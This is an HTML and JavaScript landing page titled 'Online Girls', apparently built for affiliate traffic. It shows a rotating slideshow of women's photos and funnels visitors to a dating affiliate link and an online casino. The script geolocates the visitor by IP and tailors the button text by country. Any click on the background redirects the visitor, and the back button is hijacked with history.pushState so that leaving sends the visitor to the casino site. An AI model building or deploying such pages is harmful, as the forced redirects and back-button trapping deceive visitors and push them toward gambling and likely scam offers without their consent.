<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Online Girls</title>

<style>
body{
  margin:0; height:100vh; background:#111 center/cover no-repeat;
  font-family:Arial; cursor:pointer;
  transition: background-image 1s ease, transform 0.6s ease;
}

.overlay{
  position:absolute; width:100%; height:100%;
  background:rgba(0,0,0,0.25); pointer-events:none;
}

/* ===== КОНТЕЙНЕР ===== */
.btn-wrap{
  position:fixed;
  bottom:15px;
  left:50%;
  transform:translateX(-50%);
  display:flex;
  gap:10px;
  z-index:10;
}

/* ===== ОБЩИЕ КНОПКИ ===== */
.bottom-btn{
  padding:12px 16px;
  font-size:15px;
  font-weight:bold;
  text-align:center;
  text-decoration:none;
  color:white;
  border-radius:12px;
  white-space:nowrap;

  backdrop-filter: blur(6px);
  transition: all 0.25s ease;
}

.bottom-btn::after{
  content:" →";
}

.bottom-btn:hover{
  transform: scale(1.08);
}

/* ===== CASINO (меньше, слева) ===== */
#casinoBtn{
  order:1;
  display:none;

  background: linear-gradient(135deg, rgba(0,200,83,0.85), rgba(0,230,118,0.85));
  box-shadow: 0 4px 18px rgba(0, 200, 83, 0.5);
}

/* ===== DATING (главная, больше и справа) ===== */
#datingBtn{
  order:2;

  padding:14px 22px; /* больше */
  font-size:16px;

  background: linear-gradient(135deg, rgba(255,60,60,0.9), rgba(255,138,0,0.9));
  box-shadow: 0 6px 22px rgba(255, 60, 60, 0.6);

  animation: pulseJump 2s infinite;
}

/* мягкое подпрыгивание */
@keyframes pulseJump{
  0%{transform:scale(1) translateY(0);}
  30%{transform:scale(1.06) translateY(-2px);}
  60%{transform:scale(1) translateY(0);}
  100%{transform:scale(1) translateY(0);}
}
</style>
</head>

<body>

<div class="overlay"></div>

<div class="btn-wrap">
  <a id="casinoBtn" class="bottom-btn" href="#"></a>
  <a id="datingBtn" class="bottom-btn" href="#"></a>
</div>

<script>
// ===== ССЫЛКИ =====
const DATING="https://prev.affomelody.com/click?pid=6350&offer_id=25",
      CASINO="https://onlinepnpbit.com/2Vi4txHl/";

// ===== ФОТО =====
const girls = Array.from({length:66},(_,i)=>`https://SheOnline24.github.io/tender/photos/FindGirl${i+1}.jpg`);

// ===== ФОН =====
let currentIndex=Math.floor(Math.random()*girls.length);

function preloadNext(n=3){
  for(let i=1;i<=n;i++){
    const idx=(currentIndex+i)%girls.length;
    const img=new Image();
    img.src=girls[idx];
  }
}

function changeBackground(){
  document.body.style.backgroundImage=`url('${girls[currentIndex]}')`;
  document.body.style.transform="scale(1.03)";
  setTimeout(()=>document.body.style.transform="scale(1)",600);
  preloadNext();
  currentIndex=(currentIndex+1)%girls.length;
}

window.onload=()=>{
  changeBackground();
  setInterval(changeBackground,7000);
};

// ===== ГЕО =====
fetch("https://ipapi.co/json/")
  .then(r=>r.json())
  .then(data=>handleGeo(data))
  .catch(()=>handleGeo({country:"US"}));

function handleGeo(loc){
  const country=loc.country||"US",
        datingBtn=document.getElementById("datingBtn"),
        casinoBtn=document.getElementById("casinoBtn"),
        cis=["RU","UA","KZ","BY"],
        copy={
          RU:{dating:"❤️ Анкеты", casino:"🎰 Бонус"},
          UA:{dating:"❤️ Анкети", casino:"🎰 Бонус"},
          KZ:{dating:"❤️ Анкеты", casino:"🎰 Бонус"},
          BY:{dating:"❤️ Анкеты", casino:"🎰 Бонус"},
          US:{dating:"🔥 Singles", casino:"🎰 Bonus"},
          GB:{dating:"🔥 Profiles", casino:"🎰 Bonus"},
          CA:{dating:"🔥 Meet", casino:"🎰 Bonus"},
          AU:{dating:"🔥 Profiles", casino:"🎰 Bonus"},
          DEFAULT:{dating:"🔥 Profiles", casino:"🎰 Bonus"}
        },
        texts=copy[country]||copy.DEFAULT;

  datingBtn.innerText=texts.dating;
  casinoBtn.innerText=texts.casino;
  datingBtn.href=DATING;
  casinoBtn.href=CASINO;

  if(cis.includes(country)){
    casinoBtn.style.display="none";
    setTimeout(()=>casinoBtn.style.display="block",15000);
  } else {
    casinoBtn.style.display="block";
  }

  document.body.addEventListener("click",e=>{
    if(!e.target.closest("a")){
      window.location.href=cis.includes(country)?DATING:CASINO;
    }
  });

  [datingBtn,casinoBtn].forEach(btn=>{
    btn.addEventListener("click",e=>{
      e.stopPropagation();
      window.location.href=btn.href;
    });
  });
}

// ===== BACK BUTTON =====
history.pushState(null,null,location.href);
window.addEventListener("popstate",()=>window.location.href=CASINO);
</script>

</body>
</html>
